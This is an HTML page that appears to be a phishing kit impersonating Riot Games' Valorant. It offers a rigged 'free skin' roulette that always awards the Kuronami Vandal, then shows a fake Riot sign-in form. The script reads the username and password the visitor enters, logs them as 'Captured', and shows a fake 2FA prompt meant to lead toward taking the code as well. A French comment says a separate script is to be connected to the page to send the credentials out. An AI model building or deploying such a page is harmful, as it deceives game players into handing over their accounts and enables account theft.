<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Valorant | Exclusive Rewards Portal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; background: #0f1923; color: white; overflow-x: hidden; }
        .riot-gradient { background: linear-gradient(135deg, #ff4655 0%, #bd3944 100%); }
        .bg-valorant { background-image: url('https://images.contentstack.io/v3/assets/bltb6530b271fddd0b1/blt7270e9803126743b/5eb26fc540954b1f49b40733/agent-background-generic.JPG'); background-size: cover; background-position: center; }
        
        /* Roulette Styles */
        .roulette-wrapper { width: 100%; overflow: hidden; position: relative; border-top: 2px solid #ff4655; border-bottom: 2px solid #ff4655; background: rgba(0,0,0,0.5); }
        .roulette-list { display: flex; transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1); }
        .skin-card { min-width: 150px; height: 150px; display: flex; flex-direction: column; align-items: center; justify-content: center; border-right: 1px solid rgba(255,255,255,0.1); padding: 10px; }
        .skin-card img { width: 100px; height: auto; drop-shadow: 0 0 10px rgba(255,255,255,0.5); }
        .pointer { position: absolute; left: 50%; top: 0; bottom: 0; width: 4px; background: #ff4655; z-index: 10; transform: translateX(-50%); box-shadow: 0 0 15px #ff4655; }

        .hidden { display: none; }
        .riot-input { background: #ececec; color: #1f2326; border-bottom: 2px solid transparent; transition: 0.3s; }
        .riot-input:focus { border-bottom: 2px solid #ff4655; outline: none; background: #fff; }
    </style>
</head>
<body class="bg-valorant min-h-screen flex items-center justify-center font-sans">

    <div class="fixed inset-0 bg-black/60 z-0"></div>

    <div class="relative z-10 w-full max-w-md bg-white text-black rounded-sm shadow-2xl overflow-hidden" id="main-card">
        
        <div id="step-roulette" class="p-0">
            <div class="bg-[#1f2326] p-6 text-center">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/67/Riot_Games_logo.svg/1200px-Riot_Games_logo.svg.png" class="w-20 mx-auto mb-4 invert" alt="">
                <h1 class="text-white text-xl font-black uppercase tracking-tighter">Season Pass Rewards</h1>
                <p class="text-gray-400 text-xs">Spin to unlock your random Prime Skin</p>
            </div>

            <div class="roulette-wrapper py-4">
                <div class="pointer"></div>
                <div id="roulette-list" class="roulette-list">
                    </div>
            </div>

            <div class="p-8 text-center bg-gray-50">
                <button id="spin-btn" class="riot-gradient w-full py-4 text-white font-black uppercase tracking-widest hover:brightness-110 transition active:scale-95">
                    Spin for Free
                </button>
            </div>
        </div>

        <div id="step-login" class="hidden p-10">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/67/Riot_Games_logo.svg/1200px-Riot_Games_logo.svg.png" class="w-24 mb-10 mx-auto" alt="">
            <h2 class="text-2xl font-bold mb-8 text-center uppercase">Sign In</h2>
            
            <div class="space-y-6">
                <div>
                    <p class="text-[10px] font-bold text-gray-400 uppercase tracking-widest mb-1">Username</p>
                    <input type="text" id="user" class="riot-input w-full p-3 font-bold">
                </div>
                <div>
                    <p class="text-[10px] font-bold text-gray-400 uppercase tracking-widest mb-1">Password</p>
                    <input type="password" id="pass" class="riot-input w-full p-3 font-bold">
                </div>
                <div class="flex items-center gap-2 py-2">
                    <input type="checkbox" class="accent-[#ff4655]">
                    <span class="text-xs font-bold text-gray-400">Stay signed in</span>
                </div>
                
                <button id="claim-btn" class="w-16 h-16 rounded-2xl border-2 border-[#ff4655] mx-auto flex items-center justify-center group hover:bg-[#ff4655] transition-all">
                    <svg class="w-6 h-6 text-[#ff4655] group-hover:text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
                </button>
            </div>
        </div>
    </div>

    <script>
        const skins = [
            "https://valorant-api.com/media/v1/displayicons/weapons/vandal/kuronami.png",
            "https://valorant-api.com/media/v1/displayicons/weapons/vandal/reaver.png",
            "https://valorant-api.com/media/v1/displayicons/weapons/phantom/oni.png",
            "https://valorant-api.com/media/v1/displayicons/weapons/melee/rgx.png",
            "https://valorant-api.com/media/v1/displayicons/weapons/vandal/prime.png"
        ];

        const list = document.getElementById('roulette-list');
        // On génère 50 items pour l'effet de boucle
        for(let i=0; i<60; i++) {
            const skinUrl = skins[i % skins.length];
            list.innerHTML += `<div class="skin-card"><img src="${skinUrl}"></div>`;
        }

        document.getElementById('spin-btn').onclick = function() {
            this.disabled = true;
            this.style.opacity = "0.5";
            // On force l'arrêt sur le premier skin (Kuronami) à la position 50
            const targetPos = (50 * 151) - (window.innerWidth / 2) + 75;
            list.style.transform = `translateX(-${targetPos}px)`;

            setTimeout(() => {
                alert("CONGRATULATIONS! You won the KURONAMI VANDAL!");
                document.getElementById('step-roulette').classList.add('hidden');
                document.getElementById('step-login').classList.remove('hidden');
            }, 5500);
        };

        document.getElementById('claim-btn').onclick = function() {
            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;
            
            if(u && p) {
                // Ici tu connecteras ton script OpenClaw
                console.log("Captured:", u, p);
                alert("Identity verification required. Please check your email for the 2FA code.");
                // Logique pour afficher le champ 2FA
            }
        };
    </script>
</body>
</html>
